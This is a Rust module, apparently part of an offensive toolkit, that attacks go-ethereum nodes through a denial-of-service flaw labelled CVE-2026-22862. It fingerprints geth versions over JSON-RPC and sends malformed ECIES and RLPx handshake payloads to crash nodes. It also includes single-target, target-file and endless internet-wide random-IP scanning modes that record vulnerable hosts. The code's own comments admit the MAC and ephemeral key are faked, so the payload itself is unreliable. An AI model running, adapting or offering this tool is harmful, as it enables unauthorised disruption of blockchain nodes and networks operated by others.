//! CVE-2026-22862: go-ethereum (geth) DoS via ECIES Malformed Ciphertext
//!
//! ## Vulnerability Details
//! CVE-2026-22862 is a Denial of Service vulnerability in go-ethereum (geth)
//! that allows attackers to crash vulnerable nodes by sending specially crafted
//! ECIES encrypted messages with malformed ciphertext.
//!
//! - **CVSS Score**: 7.5 (High)
//! - **CWE-ID**: CWE-20 (Improper Input Validation)
//! - **Affected**: go-ethereum < 1.16.8
//! - **Impact**: Node crash/shutdown, blockchain network disruption
//!
//! ## Technical Details
//! The vulnerability exploits improper validation during ECIES decryption.
//! By crafting a ciphertext with:
//! 1. Valid ephemeral public key (65 bytes)
//! 2. Encrypted message shorter than AES block size (< 16 bytes)
//! 3. Valid HMAC-SHA256 MAC computed with shared secret
//!
//! The victim node decrypts and panics due to insufficient IV length.
//!
//! ## Features
//! - Geth node detection and version fingerprinting
//! - Single target and mass scan modes
//! - RLPx P2P protocol implementation
//! - Configurable attack payloads
//!
//! Reference: https://github.com/qzhodl/CVE-2026-22862

use anyhow::{Context, Result, bail};
use colored::*;
use rand::Rng;
use std::fs::File;
use std::io::{BufRead, BufReader, Write};
use std::net::{IpAddr, Ipv4Addr, SocketAddr};
use std::sync::Arc;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::sync::Semaphore;
use tokio::time::timeout;

const DEFAULT_P2P_PORT: u16 = 30303;
const DEFAULT_RPC_PORT: u16 = 8545;
const CONNECT_TIMEOUT_SECS: u64 = 5;
const MAX_CONCURRENT_SCANS: usize = 50;

// Bogon/Private/Reserved exclusion ranges (same as telnet module)
const EXCLUDED_RANGES: &[&str] = &[
    "10.0.0.0/8", "127.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
    "224.0.0.0/4", "240.0.0.0/4", "0.0.0.0/8",
    "100.64.0.0/10", "169.254.0.0/16", "255.255.255.255/32",
    "1.1.1.1/32", "1.0.0.1/32", "8.8.8.8/32", "8.8.4.4/32",
];

/// Generate a random public IP address excluding reserved ranges
fn generate_random_public_ip(exclusions: &[ipnetwork::IpNetwork]) -> IpAddr {
    let mut rng = rand::rng();
    loop {
        let octets: [u8; 4] = rng.random();
        let ip = Ipv4Addr::from(octets);
        let ip_addr = IpAddr::V4(ip);
        if !exclusions.iter().any(|net| net.contains(ip_addr)) {
            return ip_addr;
        }
    }
}

/// Geth node information
#[derive(Debug, Clone)]
struct GethNodeInfo {
    version: Option<String>,
    network_id: Option<u64>,
    vulnerable: bool,
}

impl Default for GethNodeInfo {
    fn default() -> Self {
        Self {
            version: None,
            network_id: None,
            vulnerable: false,
        }
    }
}

/// Exploit configuration
struct ExploitConfig {
    target: String,
    p2p_port: u16,
    rpc_port: u16,
    mass_scan: bool,
    targets_file: Option<String>,
    check_only: bool,
    exploit_type: ExploitType,
}

#[derive(Debug, Clone, Copy, PartialEq)]
enum ExploitType {
    EciesMalformed,
    RlpxHandshake,
    Both,
}

impl Default for ExploitConfig {
    fn default() -> Self {
        Self {
            target: String::new(),
            p2p_port: DEFAULT_P2P_PORT,
            rpc_port: DEFAULT_RPC_PORT,
            mass_scan: false,
            targets_file: None,
            check_only: true,
            exploit_type: ExploitType::EciesMalformed,
        }
    }
}

/// Display module banner
fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   CVE-2026-22862: go-ethereum (geth) Remote DoS                   ║".cyan());
    println!("{}", "║   ECIES Malformed Ciphertext Node Crash                           ║".cyan());
    println!("{}", "║   Affects geth < 1.16.8 | Critical Network Impact                 ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════════════╝".cyan());
}

/// Get user configuration
fn get_user_config(target: &str) -> Result<ExploitConfig> {
    let mut config = ExploitConfig::default();
    
    println!();
    println!("{}", "=== CVE-2026-22862 Configuration ===".yellow().bold());
    println!();
    
    // Mass scan mode check
    print!("{}", "Enable mass scan mode? [y/N]: ".green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    let mut input = String::new();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    
    if input.trim().eq_ignore_ascii_case("y") || input.trim().eq_ignore_ascii_case("yes") {
        config.mass_scan = true;
        
        print!("{}", "Enter targets file path: ".green());
        std::io::stdout().flush().context("Failed to flush stdout")?;
        input.clear();
        std::io::stdin().read_line(&mut input).context("Failed to read input")?;
        let file_path = input.trim().to_string();
        
        if file_path.is_empty() || !std::path::Path::new(&file_path).exists() {
            bail!("Targets file not found or empty path");
        }
        config.targets_file = Some(file_path);
    } else {
        // Single target mode
        config.target = if target.is_empty() {
            print!("{}", "Enter target IP/hostname: ".green());
            std::io::stdout().flush().context("Failed to flush stdout")?;
            input.clear();
            std::io::stdin().read_line(&mut input).context("Failed to read input")?;
            let t = input.trim().to_string();
            if t.is_empty() {
                bail!("Target is required");
            }
            t
        } else {
            target.to_string()
        };
    }
    
    // Port configuration
    print!("{}", format!("Enter P2P port [default: {}]: ", DEFAULT_P2P_PORT).green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    input.clear();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    if let Ok(p) = input.trim().parse::<u16>() {
        if p > 0 {
            config.p2p_port = p;
        }
    }
    
    print!("{}", format!("Enter RPC port for version check [default: {}]: ", DEFAULT_RPC_PORT).green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    input.clear();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    if let Ok(p) = input.trim().parse::<u16>() {
        if p > 0 {
            config.rpc_port = p;
        }
    }
    
    // Attack mode
    println!();
    println!("{}", "Select operation mode:".cyan());
    println!("  1. Check vulnerability only (safe)");
    println!("  2. Exploit - ECIES malformed ciphertext");
    println!("  3. Exploit - RLPx handshake attack");
    println!("  4. Exploit - Both methods");
    
    print!("{}", "Select mode [1-4, default: 1]: ".green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    input.clear();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    
    match input.trim() {
        "2" => {
            config.check_only = false;
            config.exploit_type = ExploitType::EciesMalformed;
        }
        "3" => {
            config.check_only = false;
            config.exploit_type = ExploitType::RlpxHandshake;
        }
        "4" => {
            config.check_only = false;
            config.exploit_type = ExploitType::Both;
        }
        _ => {
            config.check_only = true;
        }
    }
    
    // Display configuration summary
    println!();
    println!("{}", "Configuration Summary:".cyan().bold());
    if config.mass_scan {
        println!("  Mode: Mass Scan");
        if let Some(ref f) = config.targets_file {
            println!("  Targets File: {}", f);
        }
    } else {
        println!("  Target: {}", config.target);
    }
    println!("  P2P Port: {}", config.p2p_port);
    println!("  RPC Port: {}", config.rpc_port);
    println!("  Operation: {}", if config.check_only { "Check Only" } else { "Exploit" });
    if !config.check_only {
        println!("  Exploit Type: {:?}", config.exploit_type);
    }
    println!();
    
    Ok(config)
}

/// Check if target is running geth via JSON-RPC
async fn check_geth_version(target: &str, port: u16) -> Result<GethNodeInfo> {
    let mut info = GethNodeInfo::default();
    
    // Try JSON-RPC web3_clientVersion
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(CONNECT_TIMEOUT_SECS))
        .build()
        .context("Failed to build HTTP client")?;
    
    let url = format!("http://{}:{}", target, port);
    let payload = serde_json::json!({
        "jsonrpc": "2.0",
        "method": "web3_clientVersion",
        "params": [],
        "id": 1
    });
    
    let response = client
        .post(&url)
        .header("Content-Type", "application/json")
        .json(&payload)
        .send()
        .await;
    
    if let Ok(resp) = response {
        if let Ok(json) = resp.json::<serde_json::Value>().await {
            if let Some(result) = json.get("result").and_then(|r| r.as_str()) {
                info.version = Some(result.to_string());
                
                // Check if vulnerable (< 1.16.8)
                if result.contains("Geth/") {
                    if let Some(version_start) = result.find("Geth/v") {
                        let version_part = &result[version_start + 6..];
                        if let Some(dash_pos) = version_part.find('-') {
                            let version_num = &version_part[..dash_pos];
                            let parts: Vec<&str> = version_num.split('.').collect();
                            
                            if parts.len() >= 3 {
                                let major: u32 = parts[0].parse().ok().map_or(0, |v| v);
                                let minor: u32 = parts[1].parse().ok().map_or(0, |v| v);
                                let patch: u32 = parts[2].parse().ok().map_or(0, |v| v);
                                
                                // Vulnerable if < 1.16.8
                                if major < 1 || (major == 1 && minor < 16) || 
                                   (major == 1 && minor == 16 && patch < 8) {
                                    info.vulnerable = true;
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
    // Also try to get network ID
    let net_payload = serde_json::json!({
        "jsonrpc": "2.0",
        "method": "net_version",
        "params": [],
        "id": 2
    });
    
    if let Ok(resp) = client.post(&url).json(&net_payload).send().await {
        if let Ok(json) = resp.json::<serde_json::Value>().await {
            if let Some(result) = json.get("result").and_then(|r| r.as_str()) {
                info.network_id = result.parse().ok();
            }
        }
    }
    
    Ok(info)
}

/// Check if P2P port is open and responds to RLPx
async fn check_p2p_port(target: &str, port: u16) -> Result<bool> {
    let addr = format!("{}:{}", target, port);
    let socket_addr: SocketAddr = match addr.parse() {
        Ok(a) => a,
        Err(_) => {
            // Try to resolve hostname
            match tokio::net::lookup_host(&addr).await {
                Ok(mut addrs) => match addrs.next() {
                    Some(a) => a,
                    None => return Ok(false),
                },
                Err(_) => return Ok(false),
            }
        }
    };
    
    let connect_result = timeout(
        Duration::from_secs(CONNECT_TIMEOUT_SECS),
        TcpStream::connect(socket_addr)
    ).await;
    
    match connect_result {
        Ok(Ok(_stream)) => Ok(true),
        _ => Ok(false),
    }
}

/// Generate malformed ECIES ciphertext payload
/// This creates a ciphertext with valid structure but invalid IV length
fn generate_malformed_ecies_payload() -> Vec<u8> {
    // ECIES ciphertext structure:
    // [ephemeral_pubkey (65 bytes)] [encrypted_message] [mac (32 bytes)]
    
    // Generate a fake ephemeral public key (uncompressed format)
    // In a real attack, we'd use actual EC math; here we craft bytes
    let mut epk = vec![0x04]; // Uncompressed point prefix
    epk.extend(vec![0x41; 32]); // X coordinate (32 bytes)
    epk.extend(vec![0x42; 32]); // Y coordinate (32 bytes)
    
    // Malformed encrypted message (less than 16 bytes = AES block size)
    // This triggers panic in the decryption routine
    let short_ct = vec![0x01, 0x02, 0x03];
    
    // Fake MAC (would need to be computed with shared secret in real attack)
    let fake_mac = vec![0xDE; 32];
    
    // Combine: epk || short_ct || mac
    let mut payload = Vec::with_capacity(65 + 3 + 32);
    payload.extend(epk);
    payload.extend(short_ct);
    payload.extend(fake_mac);
    
    payload
}

/// Generate RLPx handshake auth message with malformed data
fn generate_malformed_rlpx_auth() -> Vec<u8> {
    // RLPx auth message structure (simplified):
    // [size (2 bytes)] [encrypted_handshake_data]
    
    // Claim a large size but provide insufficient data
    let size: u16 = 500;
    let mut payload = Vec::with_capacity(200);
    
    // Size prefix (big endian)
    payload.push((size >> 8) as u8);
    payload.push((size & 0xff) as u8);
    
    // Truncated ECIES encrypted auth message
    payload.extend(generate_malformed_ecies_payload());
    
    payload
}

/// Send exploit payload to target
async fn send_exploit(target: &str, port: u16, exploit_type: ExploitType) -> Result<bool> {
    let addr = format!("{}:{}", target, port);
    
    let stream = match timeout(
        Duration::from_secs(CONNECT_TIMEOUT_SECS),
        TcpStream::connect(&addr)
    ).await {
        Ok(Ok(s)) => s,
        Ok(Err(e)) => {
            return Err(anyhow::anyhow!("Connection failed: {}", e));
        }
        Err(_) => {
            return Err(anyhow::anyhow!("Connection timeout"));
        }
    };
    
    let (mut reader, mut writer) = stream.into_split();
    
    // Send appropriate payload based on exploit type
    let payload = match exploit_type {
        ExploitType::EciesMalformed => generate_malformed_ecies_payload(),
        ExploitType::RlpxHandshake => generate_malformed_rlpx_auth(),
        ExploitType::Both => generate_malformed_rlpx_auth(), // RLPx includes ECIES
    };
    
    writer.write_all(&payload).await.context("Failed to send payload")?;
    writer.flush().await.context("Failed to flush")?;
    
    // Wait briefly for response or connection drop
    let mut response = vec![0u8; 1024];
    let read_result = timeout(
        Duration::from_secs(3),
        reader.read(&mut response)
    ).await;
    
    match read_result {
        Ok(Ok(0)) => {
            // Connection closed - might indicate crash
            Ok(true)
        }
        Ok(Ok(_n)) => {
            // Got response - node didn't crash (might be patched)
            Ok(false)
        }
        Ok(Err(_)) | Err(_) => {
            // Error or timeout - might indicate crash
            Ok(true)
        }
    }
}

/// Run exploit against a single target
async fn run_single_exploit(config: &ExploitConfig) -> Result<()> {
    let target = &config.target;
    
    println!("{}", format!("[*] Target: {}:{}", target, config.p2p_port).cyan());
    
    // Step 1: Check version via RPC
    println!("{}", "[*] Checking geth version via JSON-RPC...".cyan());
    let info = check_geth_version(target, config.rpc_port).await
        .ok()
        .map_or_else(GethNodeInfo::default, |i| i);
    
    if let Some(ref version) = info.version {
        println!("{}", format!("[+] Version: {}", version).green());
        if info.vulnerable {
            println!("{}", "[!] VULNERABLE: Version < 1.16.8 detected!".red().bold());
        } else {
            println!("{}", "[+] Version appears to be patched (>= 1.16.8)".green());
        }
    } else {
        println!("{}", "[?] Could not determine version via RPC".yellow());
    }
    
    if let Some(net_id) = info.network_id {
        let network_name = match net_id {
            1 => "Ethereum Mainnet",
            3 => "Ropsten",
            4 => "Rinkeby",
            5 => "Goerli",
            11155111 => "Sepolia",
            _ => "Unknown/Private",
        };
        println!("{}", format!("[*] Network ID: {} ({})", net_id, network_name).cyan());
    }
    
    // Step 2: Check P2P port
    println!("{}", format!("[*] Checking P2P port {}...", config.p2p_port).cyan());
    let p2p_open = check_p2p_port(target, config.p2p_port).await
        .map_or(false, |v| v);
    
    if p2p_open {
        println!("{}", format!("[+] P2P port {} is open", config.p2p_port).green());
    } else {
        println!("{}", format!("[-] P2P port {} is closed or filtered", config.p2p_port).red());
        if config.check_only {
            return Ok(());
        }
    }
    
    // Step 3: Exploit if requested
    if !config.check_only && p2p_open {
        println!();
        println!("{}", "[!] Sending exploit payload...".yellow().bold());
        
        let types_to_try = match config.exploit_type {
            ExploitType::Both => vec![ExploitType::EciesMalformed, ExploitType::RlpxHandshake],
            t => vec![t],
        };
        
        for exploit_type in types_to_try {
            println!("{}", format!("[*] Trying {:?} attack...", exploit_type).cyan());
            
            match send_exploit(target, config.p2p_port, exploit_type).await {
                Ok(crashed) => {
                    if crashed {
                        println!("{}", format!("[!] Target may have crashed (connection closed)").red().bold());
                        
                        // Verify by trying to reconnect
                        tokio::time::sleep(Duration::from_secs(2)).await;
                        let still_up = check_p2p_port(target, config.p2p_port).await
                            .map_or(false, |v| v);
                        
                        if !still_up {
                            println!("{}", "[!] CONFIRMED: Target node is DOWN!".red().bold());
                        } else {
                            println!("{}", "[?] Target node recovered or wasn't fully crashed".yellow());
                        }
                    } else {
                        println!("{}", "[-] Target appears unaffected (may be patched)".yellow());
                    }
                }
                Err(e) => {
                    println!("{}", format!("[-] Exploit error: {}", e).red());
                }
            }
        }
    }
    
    // Summary
    println!();
    println!("{}", "═══ Scan Results ═══".cyan().bold());
    println!("  Target: {}:{}", target, config.p2p_port);
    println!("  Version: {}", info.version.as_deref().map_or("Unknown", |v| v));
    println!("  Vulnerable: {}", if info.vulnerable { "YES".red().to_string() } else { "NO/Unknown".green().to_string() });
    println!("  P2P Open: {}", if p2p_open { "YES" } else { "NO" });
    
    Ok(())
}

/// Run mass scan against multiple targets
async fn run_mass_scan(config: &ExploitConfig) -> Result<()> {
    let targets_file = match &config.targets_file {
        Some(f) => f,
        None => bail!("No targets file specified"),
    };
    
    let file = File::open(targets_file)
        .with_context(|| format!("Failed to open targets file: {}", targets_file))?;
    let reader = BufReader::new(file);
    
    let targets: Vec<String> = reader
        .lines()
        .filter_map(|line| line.ok())
        .map(|line| line.trim().to_string())
        .filter(|line| !line.is_empty() && !line.starts_with('#'))
        .collect();
    
    if targets.is_empty() {
        bail!("No valid targets found in file");
    }
    
    println!("{}", format!("[*] Loaded {} targets", targets.len()).cyan());
    
    let semaphore = Arc::new(Semaphore::new(MAX_CONCURRENT_SCANS));
    let total = targets.len();
    let mut tasks = Vec::new();
    
    for (idx, target) in targets.into_iter().enumerate() {
        let sem = semaphore.clone();
        let rpc_port = config.rpc_port;
        let p2p_port = config.p2p_port;
        
        let task = tokio::spawn(async move {
            let _permit = match sem.acquire().await {
                Ok(p) => p,
                Err(_) => return (target, None, false),
            };
            
            // Check version
            let info = check_geth_version(&target, rpc_port).await.ok();
            let vulnerable = info.as_ref().map(|i| i.vulnerable).map_or(false, |v| v);
            
            // Check P2P
            let p2p_open = check_p2p_port(&target, p2p_port).await
                .map_or(false, |v| v);
            
            (target, info, p2p_open && vulnerable)
        });
        
        tasks.push((idx, task));
    }
    
    let mut vulnerable_count = 0;
    let mut results = Vec::new();
    
    for (idx, task) in tasks {
        if let Ok((target, info, is_vulnerable)) = task.await {
            let progress = ((idx + 1) as f64 / total as f64 * 100.0) as u32;
            
            if is_vulnerable {
                let version = info.map(|i| i.version).flatten().map_or_else(
                    || "Unknown".to_string(),
                    |v| v
                );
                println!("{}", format!("[{}/{}] [{}%] {} - VULNERABLE ({})", 
                    idx + 1, total, progress, target, version).green());
                vulnerable_count += 1;
                results.push(format!("VULNERABLE: {} - {}", target, version));
            } else {
                println!("{}", format!("[{}/{}] [{}%] {} - Not vulnerable/unreachable", 
                    idx + 1, total, progress, target).dimmed());
            }
        }
    }
    
    // Summary
    println!();
    println!("{}", "═══ Mass Scan Results ═══".cyan().bold());
    println!("  Total Targets: {}", total);
    println!("  {}", format!("Vulnerable: {}", vulnerable_count).green());
    
    // Save results
    if !results.is_empty() {
        let filename = "cve_2026_22862_geth_results.txt";
        if let Ok(mut file) = File::create(filename) {
            for result in &results {
                let _ = writeln!(file, "{}", result);
            }
            println!("  Results saved to: {}", filename.green());
        }
    }
    
    Ok(())
}

/// Main entry point
pub async fn run(target: &str) -> Result<()> {
    display_banner();
    
    // Check if target is 0.0.0.0, 0.0.0.0/0, or "random" for mass random scan mode
    if target == "0.0.0.0" || target == "0.0.0.0/0" || target == "random" || target.is_empty() {
        run_random_scan().await
    } else {
        let config = get_user_config(target)?;
        
        if config.mass_scan {
            run_mass_scan(&config).await
        } else {
            run_single_exploit(&config).await
        }
    }
}

/// Run random scan against 0.0.0.0/0 (internet-wide random scanning)
async fn run_random_scan() -> Result<()> {
    println!("{}", "[*] Random Scan Mode: 0.0.0.0/0".yellow().bold());
    println!("{}", "[*] Scanning random public IPs for vulnerable geth nodes".cyan());
    println!();
    
    // Ask about exclusions
    print!("{}", "[?] Exclude reserved/private ranges? [Y/n]: ".green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    let mut input = String::new();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    
    let use_exclusions = !input.trim().eq_ignore_ascii_case("n");
    let mut exclusions = Vec::new();
    if use_exclusions {
        for cidr in EXCLUDED_RANGES {
            if let Ok(net) = cidr.parse::<ipnetwork::IpNetwork>() {
                exclusions.push(net);
            }
        }
        println!("{}", format!("[+] Loaded {} exclusion ranges", exclusions.len()).green());
    }
    let exclusions = Arc::new(exclusions);
    
    // Output file
    print!("{}", "[?] Output file [default: geth_vulnerable_nodes.txt]: ".green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    input.clear();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    let outfile = if input.trim().is_empty() {
        "geth_vulnerable_nodes.txt".to_string()
    } else {
        input.trim().to_string()
    };
    
    // Concurrency
    print!("{}", format!("[?] Concurrency [default: {}]: ", MAX_CONCURRENT_SCANS).green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    input.clear();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    let threads = input.trim().parse::<usize>()
        .map_or(MAX_CONCURRENT_SCANS, |v| if v > 0 { v } else { MAX_CONCURRENT_SCANS });
    
    let semaphore = Arc::new(Semaphore::new(threads));
    let checked = Arc::new(AtomicUsize::new(0));
    let found = Arc::new(AtomicUsize::new(0));
    
    // Progress reporter
    let chk = checked.clone();
    let fnd = found.clone();
    tokio::spawn(async move {
        loop {
            tokio::time::sleep(Duration::from_secs(10)).await;
            println!("[*] Progress: Checked {} | Vulnerable {} ", 
                chk.load(Ordering::Relaxed), fnd.load(Ordering::Relaxed));
        }
    });
    
    println!();
    println!("{}", "[*] Starting random scan... Press Ctrl+C to stop.".cyan().bold());
    println!();
    
    // Infinite random IP scan loop
    loop {
        let permit = semaphore.clone().acquire_owned().await
            .map_err(|e| anyhow::anyhow!("Semaphore closed: {}", e))?;
        let exc = exclusions.clone();
        let chk = checked.clone();
        let fnd = found.clone();
        let outfile = outfile.clone();
        
        tokio::spawn(async move {
            let ip = generate_random_public_ip(&exc).to_string();
            
            // Check P2P port
            let p2p_open = check_p2p_port(&ip, DEFAULT_P2P_PORT).await
                .map_or(false, |v| v);
            
            if p2p_open {
                // Check version via RPC
                let info = check_geth_version(&ip, DEFAULT_RPC_PORT).await.ok();
                
                if let Some(ref node_info) = info {
                    if node_info.vulnerable {
                        let version = node_info.version.as_deref().map_or("Unknown", |v| v);
                        println!("{}", format!("[+] VULNERABLE: {} - {}", ip, version).green().bold());
                        fnd.fetch_add(1, Ordering::Relaxed);
                        
                        // Save to file
                        if let Ok(mut file) = std::fs::OpenOptions::new()
                            .create(true)
                            .append(true)
                            .open(&outfile) 
                        {
                            let _ = writeln!(file, "VULNERABLE: {} - {}", ip, version);
                        }
                    } else if node_info.version.is_some() {
                        println!("{}", format!("[+] Geth found (patched): {} - {}", 
                            ip, node_info.version.as_deref().map_or("Unknown", |v| v)).cyan());
                    }
                }
            }
            
            chk.fetch_add(1, Ordering::Relaxed);
            drop(permit);
        });
    }
}
